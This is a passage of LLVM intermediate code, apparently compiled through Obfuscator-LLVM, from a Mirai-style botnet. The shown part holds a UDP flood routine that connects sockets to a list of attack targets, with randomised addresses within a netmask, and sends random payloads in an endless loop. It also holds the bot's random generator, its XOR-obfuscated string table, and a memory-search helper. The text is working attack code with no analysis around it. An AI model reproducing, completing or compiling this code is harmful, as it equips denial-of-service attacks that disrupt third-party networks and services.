  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 %142) #7
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

; <label>:151:                                    ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 %156, %struct.sockaddr* %165, i32 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %151
  br label %169

; <label>:169:                                    ; preds = %168, %151
  br label %170

; <label>:170:                                    ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58

; <label>:173:                                    ; preds = %58
  br label %174

; <label>:174:                                    ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

; <label>:175:                                    ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

; <label>:180:                                    ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* %189, i32 %191)
  br label %192

; <label>:192:                                    ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 %197, i8* %198, i64 %200, i32 16384)
  br label %202

; <label>:202:                                    ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175

; <label>:205:                                    ; preds = %175
  br label %174
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %45, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %46

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %45

; <label>:21:                                     ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %21
  %25 = call i32 @rand_next()
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i16*
  store i16 %27, i16* %29, align 2
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 2
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 2
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  br label %44

; <label>:36:                                     ; preds = %21
  %37 = call i32 @rand_next()
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, -1
  store i32 %43, i32* %4, align 4
  br label %44

; <label>:44:                                     ; preds = %36, %24
  br label %45

; <label>:45:                                     ; preds = %44, %11
  br label %5

; <label>:46:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %54, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %55

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %45

; <label>:15:                                     ; preds = %11
  %16 = call i32 @rand_next()
  store i32 %16, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %37, %15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = icmp ult i64 %19, 4
  br i1 %20, label %21, label %40

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %6, align 4
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* %7, align 1
  %25 = load i32, i32* %6, align 4
  %26 = lshr i32 %25, 8
  store i32 %26, i32* %6, align 4
  %27 = load i8, i8* %7, align 1
  %28 = zext i8 %27 to i32
  %29 = ashr i32 %28, 3
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %7, align 1
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = getelementptr inbounds [33 x i8], [33 x i8]* @rand_alphastr.alphaset, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  store i8 %34, i8* %35, align 1
  br label %37

; <label>:37:                                     ; preds = %21
  %38 = load i32, i32* %5, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %5, align 4
  br label %17

; <label>:40:                                     ; preds = %17
  %41 = load i32, i32* %4, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %42, 4
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* %4, align 4
  br label %54

; <label>:45:                                     ; preds = %11
  %46 = call i32 @rand_next()
  %47 = zext i32 %46 to i64
  %48 = urem i64 %47, 33
  %49 = trunc i64 %48 to i8
  %50 = load i8*, i8** %3, align 8
  %51 = getelementptr inbounds i8, i8* %50, i32 1
  store i8* %51, i8** %3, align 8
  store i8 %49, i8* %50, align 1
  %52 = load i32, i32* %4, align 4
  %53 = add nsw i32 %52, -1
  store i32 %53, i32* %4, align 4
  br label %54

; <label>:54:                                     ; preds = %45, %40
  br label %8

; <label>:55:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

; <label>:43:                                     ; preds = %35
  br label %45

; <label>:44:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17

; <label>:49:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
